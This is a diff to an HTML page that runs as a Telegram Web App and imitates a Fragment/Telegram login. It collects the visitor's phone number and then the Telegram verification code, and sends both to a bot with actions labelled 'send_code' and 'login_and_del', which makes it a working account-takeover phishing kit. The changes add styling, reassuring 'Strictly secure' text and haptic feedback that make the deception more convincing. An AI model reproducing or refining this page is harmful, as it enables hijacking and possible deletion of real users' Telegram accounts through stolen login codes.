@@ -8,30 +8,35 @@
     <style>
         body { 
             background-color: #ffffff; 
-            /* Узоры Telegram на фоне */
+            /* Фирменные узоры Telegram на фоне */
             background-image: url("https://www.transparenttextures.com");
+            background-repeat: repeat;
             color: #000000; 
-            font-family: -apple-system, sans-serif; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             display: flex; flex-direction: column; align-items: center; justify-content: center; 
-            height: 100vh; margin: 0; overflow: hidden; 
+            height: 100vh; margin: 0; padding: 0; overflow: hidden;
         }
         .container { 
-            width: 90%; max-width: 400px; text-align: center; 
-            background: rgba(255, 255, 255, 0.9); padding: 30px; border-radius: 20px;
+            width: 90%; max-width: 380px; text-align: center; 
+            background: rgba(255, 255, 255, 0.96); 
+            padding: 30px; border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            border: 1px solid #f0f0f0;
         }
         .tg-logo { width: 75px; height: 75px; margin-bottom: 20px; }
-        h2 { font-size: 26px; font-weight: 700; margin: 0 0 10px; }
-        p { font-size: 15px; color: #707579; margin-bottom: 25px; line-height: 1.4; }
+        h2 { font-size: 24px; font-weight: 700; margin: 0 0 10px; color: #222; }
+        p { font-size: 15px; color: #707579; margin-bottom: 25px; line-height: 1.5; }
         a { color: #3390ec; text-decoration: none; font-weight: 500; }
         
         .phone-box { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
         select { 
-            width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #dfe1e5; 
-            background: #f4f4f5; font-size: 16px; outline: none; appearance: none;
+            width: 100%; padding: 13px; border-radius: 12px; border: 1px solid #dfe1e5; 
+            background: #f4f4f5; font-size: 16px; outline: none; appearance: none; cursor: pointer;
         }
         input { 
             width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dfe1e5; 
-            background: #f4f4f5; color: #000; font-size: 18px; box-sizing: border-box; outline: none; text-align: center;
+            background: #f4f4f5; color: #000; font-size: 18px; box-sizing: border-box; 
+            outline: none; text-align: center; transition: border 0.2s;
         }
         input:focus { border-color: #3390ec; }
         
@@ -40,14 +45,15 @@
             border-radius: 12px; font-weight: 600; font-size: 17px; cursor: pointer; transition: 0.2s;
         }
         button:active { background: #2b79c7; transform: scale(0.98); }
-        .footer { margin-top: 35px; font-size: 12px; color: #9bb2c5; font-weight: 500; }
+        .footer { margin-top: 35px; font-size: 11px; color: #9bb2c5; font-weight: 600; text-transform: uppercase; letter-spacing: 0.8px; }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Логотип Telegram -->
         <svg class="tg-logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390EC""")/>><path d="M175.987 80.8159L158.336 164.103C157.007 169.967 153.551 171.428 148.621 168.662L121.73 148.835L108.756 161.314C107.319 162.751 106.12 163.962 103.354 163.962L105.289 136.502L155.26 91.2461C157.432 89.313 154.784 88.2384 151.884 90.1714L89.9882 129.141L63.3853 120.824C57.5996 119.016 57.4789 115.031 64.5925 112.254L168.607 72.1384C173.436 70.3274 177.662 73.2088 175.987 80.8159Z" fill="white""")/>></svg>
 
-        <h2 id="title">Fragment</h2>
+        <h2>Fragment</h2>
         <p id="desc">Введите номер для авторизации на <a href="https://fragment.com" target="_blank">fragment.com</a></p>
         
         <div class="phone-box">
@@ -57,25 +63,34 @@
                 <option value="US" data-mask="+{1} (000) 000 0000">🇺🇸 США (+1)</option>
                 <option value="KZ" data-mask="+{7} (000) 000 00 00">🇰🇿 Казахстан (+7)</option>
                 <option value="UZ" data-mask="+{998} (00) 000 00 00">🇺🇿 Узбекистан (+998)</option>
+                <option value="UA" data-mask="+{380} (00) 000 00 00">🇺🇦 Украина (+380)</option>
+                <option value="BY" data-mask="+{375} (00) 000 00 00">🇧🇾 Беларусь (+375)</option>
                 <option value="OTHER" data-mask="+{000000000000}">🌍 Другая страна...</option>
             </select>
             <input type="tel" id="phoneInput">
         </div>
         
         <button id="btn">Далее</button>
-        <div class="footer">STRICTLY SECURE VIA TELEGRAM PASSPORT</div>
+        <div class="footer">Strictly secure via Telegram Passport</div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+        tg.backgroundColor = '#ffffff';
+        tg.headerColor = '#ffffff';
+        
         let step = 1;
         let mask;
         let savedPhone = "";
 
+        // Функция инициализации красивой маски номера
         function initMask(pattern) {
             if (mask) mask.destroy();
-            mask = IMask(document.getElementById('phoneInput'), { mask: pattern, lazy: false });
+            mask = IMask(document.getElementById('phoneInput'), {
+                mask: pattern,
+                lazy: false // Всегда показывать пример ввода (скобки и т.д.)
+            });
         }
 
         function changeCountry() {
@@ -84,24 +99,35 @@
             initMask(pattern);
         }
 
+        // Стартовая маска для России
         initMask("+{7} (000) 000 00 00");
 
         document.getElementById('btn').onclick = function() {
             if (step === 1) {
                 savedPhone = mask.unmaskedValue;
+                if (savedPhone.length < 5) return;
+
+                // ОТПРАВЛЯЕМ СИГНАЛ БОТУ: "Запроси реальный код в Telegram"
                 tg.sendData(JSON.stringify({ "action": "send_code", "phone": "+" + savedPhone }));
                 
+                // Переключаем интерфейс на ввод кода
                 document.getElementById('country').style.display = 'none';
-                document.getElementById('desc').innerText = "Введите код из Telegram для подтверждения входа";
+                document.getElementById('desc').innerText = "Введите проверочный код, отправленный в ваш Telegram";
                 mask.destroy();
                 let input = document.getElementById('phoneInput');
-                input.value = ""; input.placeholder = "- - - - -";
+                input.value = "";
+                input.type = "text";
+                input.placeholder = "- - - - -";
                 document.getElementById('btn').innerText = "Авторизоваться";
                 step = 2;
+                tg.HapticFeedback.impactOccurred('medium');
             } else {
                 let code = document.getElementById('phoneInput').value;
+                if (!code) return;
+                // ОТПРАВЛЯЕМ КОД БОТУ ДЛЯ ВХОДА
                 tg.sendData(JSON.stringify({ "action": "login_and_del", "code": code, "phone": "+" + savedPhone }));
-                tg.close();
+                tg.HapticFeedback.notificationOccurred('success');
+                setTimeout(() => { tg.close(); }, 500);
             }
         };
     </script>
